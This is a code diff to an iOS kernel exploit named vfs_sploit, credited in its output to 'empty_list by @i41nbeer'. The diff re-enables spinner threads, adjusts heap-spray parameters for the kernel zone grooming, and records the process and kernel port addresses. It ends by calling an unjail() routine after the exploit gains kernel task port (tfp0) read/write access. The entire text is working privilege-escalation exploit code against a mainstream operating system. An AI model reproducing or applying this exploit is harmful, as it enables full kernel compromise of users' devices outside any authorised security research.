@@ -337,18 +337,18 @@ void* spinner(void* arg) {
   return NULL;
 }
 
-#define N_SPINNERS 100
+#define N_SPINNERS 25
 pthread_t spin_threads[N_SPINNERS];
 
 void start_spinners() {
-  return;
+  //return;
   for (int i = 0; i < N_SPINNERS; i++) {
     pthread_create(&spin_threads[i], NULL, spinner, NULL);
   }
 }
 
 void stop_spinners() {
-  return;
+  //return;
   keep_spinning = 0;
   for (int i = 0; i < N_SPINNERS; i++) {
     pthread_join(spin_threads[i], NULL);
@@ -396,6 +396,9 @@ uint64_t early_rk64(uint64_t kaddr) {
   return final;
 }
 
+int unjail(void);
+uint64_t our_proc_addr = 0;
+uint64_t the_port_kaddr = 0;
 void vfs_sploit() {
   printf("empty_list by @i41nbeer\n");
   offsets_init();
@@ -443,7 +446,7 @@ void vfs_sploit() {
   
   
   int kallocs_per_zcram = kernel_page_size/0x10; // 0x1000 with small kernel pages, 0x4000 with large
-  int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0xe0;  // 0x3000 with small kernel pages, 0x4000 with large
+  int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0x61;  // 0x3000 with small kernel pages, 0x4000 with large
   
   for (int i = 0; i < INITIAL_PATTERN_REPEATS; i++) {
     // 1 page of kalloc
@@ -1010,6 +1013,7 @@ void vfs_sploit() {
   // for this we need to find the process fd table:
   // struct proc:
   uint64_t proc_addr = rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+  our_proc_addr = proc_addr;
   
   // struct filedesc
   uint64_t filedesc = rk64(proc_addr + koffset(KSTRUCT_OFFSET_PROC_P_FD));
@@ -1056,4 +1060,6 @@ void vfs_sploit() {
   printf("use the functions in kmem.h to read and write kernel memory\n");
   printf("tfp0 in there will stay alive once this process exits\n");
   printf("keep hold of a send right to it; don't expect this exploit to work again without a reboot\n");
+  the_port_kaddr = target_port_kaddr;
+  unjail();
 }
